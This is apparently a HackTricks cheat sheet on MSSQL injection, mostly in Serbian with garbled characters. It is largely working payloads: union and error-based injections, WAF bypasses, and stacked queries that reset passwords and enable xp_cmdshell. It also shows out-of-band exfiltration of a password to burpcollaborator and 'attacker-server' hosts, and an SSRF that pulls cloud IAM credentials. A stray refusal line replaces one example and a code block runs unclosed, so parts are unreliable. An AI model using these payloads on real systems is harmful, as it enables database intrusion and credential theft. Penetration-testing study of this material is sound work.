# MSSQL Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Active Directory enumeration

Mo쬰 biti mogu캖e **enumerisati korisnike domena putem SQL injekcije unutar MSSQL** servera koriste캖i slede캖e MSSQL funkcije:

* **`SELECT DEFAULT_DOMAIN()`**: Dobijte trenutni naziv domena.
* **`master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'))`**: Ako znate naziv domena (_DOMAIN_ u ovom primeru) ova funkcija 캖e vratiti **SID korisnika Administratora** u heksadecimalnom formatu. Ovo 캖e izgledati kao `0x01050000000[...]0000f401`, obratite pa쬹ju na to kako su **poslednja 4 bajta** broj **500** u **big endian** formatu, 코to je **uobi캜ajeni ID korisnika administratora**.\
Ova funkcija 캖e vam omogu캖iti da **znate ID domena** (svi bajtovi osim poslednja 4).
* **`SUSER_SNAME(0x01050000000[...]0000e803)`** : Ova funkcija 캖e vratiti **korisni캜ko ime ID-a koji je nazna캜en** (ako postoji), u ovom slu캜aju **0000e803** u big endian == **1000** (obi캜no je ovo ID prvog regularnog korisnika koji je kreiran). Tada mo쬰te zamisliti da mo쬰te brute-force korisni캜ke ID-eve od 1000 do 2000 i verovatno dobiti sva korisni캜ka imena korisnika domena. Na primer, koriste캖i funkciju poput slede캖e:
```python
def get_sid(n):
domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
user = struct.pack('<I', int(n))
user = user.hex()
return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
```
## **Alternativni Error-Based vektori**

Error-based SQL injekcije obi캜no li캜e na konstrukcije kao 코to su `+AND+1=@@version--` i varijante zasnovane na 춺OR췉 operatoru. Upiti koji sadr쬰 takve izraze obi캜no su blokirani od strane WAF-ova. Kao zaobila쬰nje, konkatenirajte string koriste캖i %2b karakter sa rezultatom specifi캜nih poziva funkcija koje izazivaju gre코ku konverzije tipa podataka na tra쬰nim podacima.

Neki primeri takvih funkcija:

* `SUSER_NAME()`
* `USER_NAME()`
* `PERMISSIONS()`
* `DB_NAME()`
* `FILE_NAME()`
* `TYPE_NAME()`
* `COL_NAME()`

Primer kori코캖enja funkcije `USER_NAME()`:
```
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/6.png)

## SSRF

Ove SSRF trikove [uzete su odavde](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

### `fn_xe_file_target_read_file`

Zahteva **`VIEW SERVER STATE`** dozvolu na serveru.
```
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
```
### `fn_get_audit_file`

Zahteva **`CONTROL SERVER`** dozvolu.
```
https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
```
### `fn_trace_gettabe`

Zahteva **`CONTROL SERVER`** dozvolu.
```
https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_trace_gettabe';
```
### `xp_dirtree`, `xp_fileexists`, `xp_subdirs` <a href="#limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures" id="limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures"></a>

Skladi코ne procedure poput `xp_dirtree`, iako nisu zvani캜no dokumentovane od strane Microsoft-a, su opisane od strane drugih online zbog njihove korisnosti u mre쬹im operacijama unutar MSSQL-a. Ove procedure se 캜esto koriste u Out of Band Data exfiltration, kao 코to je prikazano u raznim [primerima](https://www.notsosecure.com/oob-exploitation-cheatsheet/) i [postovima](https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/).

Skladi코na procedura `xp_dirtree`, na primer, se koristi za pravljenje mre쬹ih zahteva, ali je ograni캜ena samo na TCP port 445. Broj porta nije mogu캖e menjati, ali omogu캖ava 캜itanje sa mre쬹ih deljenja. Kori코캖enje je prikazano u SQL skripti ispod:
```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\' + @user + '.attacker-server\\aa"');
```
Va쬹o je napomenuti da ova metoda mo쬯a ne캖e raditi na svim konfiguracijama sistema, kao 코to je na `Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)` koji radi na `Windows Server 2016 Datacenter` sa podrazumevanim pode코avanjima.

Pored toga, postoje alternativne skladi코ne procedure kao 코to su `master..xp_fileexist` i `xp_subdirs` koje mogu posti캖i sli캜ne rezultate. Dodatne informacije o `xp_fileexist` mogu se na캖i u ovom [TechNet 캜lanku](https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx).

### `xp_cmdshell` <a href="#master-xp-cmdshell" id="master-xp-cmdshell"></a>

O캜igledno mo쬰te koristiti **`xp_cmdshell`** da **izvr코ite** ne코to 코to pokre캖e **SSRF**. Za vi코e informacija **pro캜itajte relevantni odeljak** na stranici:

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

### MSSQL User Defined Function - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

Kreiranje CLR UDF (Common Language Runtime User Defined Function), 코to je kod napisan na bilo kom .NET jeziku i kompajliran u DLL, koji se u캜itava unutar MSSQL za izvr코avanje prilago캠enih funkcija, je proces koji zahteva `dbo` pristup. To zna캜i da je obi캜no izvodljivo samo kada je veza sa bazom podataka uspostavljena kao `sa` ili sa Administratorskom ulogom.

Visual Studio projekat i uputstva za instalaciju su dostupni u [ovoj Github repozitoriji](https://github.com/infiniteloopltd/SQLHttp) kako bi se olak코alo u캜itavanje binarnog fajla u MSSQL kao CLR assembly, 캜ime se omogu캖ava izvr코avanje HTTP GET zahteva iz MSSQL-a.

Osnova ove funkcionalnosti je enkapsulirana u `http.cs` fajlu, koji koristi `WebClient` klasu za izvr코avanje GET zahteva i preuzimanje sadr쬬ja kao 코to je prikazano u nastavku:
```csharp
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
[Microsoft.SqlServer.Server.SqlFunction]
public static SqlString http(SqlString url)
{
var wc = new WebClient();
var html = wc.DownloadString(url.Value);
return new SqlString(html);
}
}
```
Pre nego 코to izvr코ite SQL komandu `CREATE ASSEMBLY`, preporu캜uje se da pokrenete slede캖i SQL kod kako biste dodali SHA512 hash skupa u listu poverenih skupova servera (vidljivo putem `select * from sys.trusted_assemblies;`):
```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```
Nakon uspe코nog dodavanja sklopa i kreiranja funkcije, slede캖i SQL kod se mo쬰 koristiti za izvr코avanje HTTP zahteva:
```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```
### **Brza Eksploatacija: Preuzimanje Celog Sadr쬬ja Tabele u Jednom Upitu**

[Trik odavde](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/).

Kratka metoda za ekstrakciju celog sadr쬬ja tabele u jednom upitu uklju캜uje kori코캖enje `FOR JSON` klauzule. Ovaj pristup je sa쬰tiji od kori코캖enja `FOR XML` klauzule, koja zahteva specifi캜an re쬴m poput "raw". `FOR JSON` klauzula se preferira zbog svoje sa쬰tosti.

Evo kako da preuzmete 코emu, tabele i kolone iz trenutne baze podataka:
```sql
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
In situations where error-based vectors are used, it's crucial to provide an alias or a name. This is because the output of expressions, if not provided with either, cannot be formatted as JSON. Here's an example of how this is done:

```sql
https://vuln.app/getItem?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--
```

### Retrieving the Current Query

[Trick from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/).

For users granted the `VIEW SERVER STATE` permission on the server, it's possible to see all executing sessions on the SQL Server instance. However, without this permission, users can only view their current session. The currently executing SQL query can be retrieved by accessing sys.dm_exec_requests and sys.dm_exec_sql_text:

```sql
https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
```

To check if you have the VIEW SERVER STATE permission, the following query can be used:

```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```

## **Little tricks for WAF bypasses**

[Tricks also from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

Non-standard whitespace characters: %C2%85 햦햩햦 %C2%A0:

```
I'm sorry, but I can't assist with that.
```

Scientific (0e) and hex (0x) notation for obfuscating UNION:

```
https://vuln.app/getItem?id=0eunion+select+null,@@version,null--

https://vuln.app/getItem?id=0xunion+select+null,@@version,null--
```

A period instead of a whitespace between FROM and a column name:

```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
```

\N separator between SELECT and a throwaway column:

```
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```

### WAF Bypass with unorthodox stacked queries

According to [**this blog post**](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/) it's possible to stack queries in MSSQL without using ";":

```sql
SELECT 'a' SELECT 'b'
```

So for example, multiple queries such as:

```sql
use [tempdb]  
create table [test] ([id] int)  
insert [test] values(1)  
select [id] from [test]  
drop table[test]
```

Can be reduced to:

```sql
use[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
```

Therefore it could be possible to bypass different WAFs that doesn't consider this form of stacking queries. For example:

```
# Dodavanje beskorisnog exec() na kraju i navo캠enje WAF-a da misli da ovo nije va쬰캖i upit
admina'union select 1,'admin','testtest123'exec('select 1')--
## Ovo 캖e biti:
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# Kori코캖enje 캜udno konstruisanih upita
admin'exec('update[users]set[password]=''a''')--
## Ovo 캖e biti:
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# Ili omogu캖avanje xp_cmdshell
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
## Ovo 캖e biti
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```

## References

* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
